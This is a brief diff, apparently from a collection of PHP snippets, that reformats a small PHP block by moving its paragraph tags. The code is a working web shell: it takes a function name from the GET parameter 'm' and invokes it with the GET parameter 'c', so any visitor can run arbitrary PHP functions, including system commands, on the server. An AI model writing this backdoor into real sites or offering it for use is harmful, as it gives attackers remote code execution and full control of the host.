@@ -6,12 +6,9 @@
 ***************************************************
 code:
 
-<?php
-<p>
+<p><?php
     $func = new ReflectionFunction($_GET[m]);
-    <p>
     echo $func->invokeArgs(array($_GET[c]));
-<p>
-?>
+?></p>
 
 ***************************************************
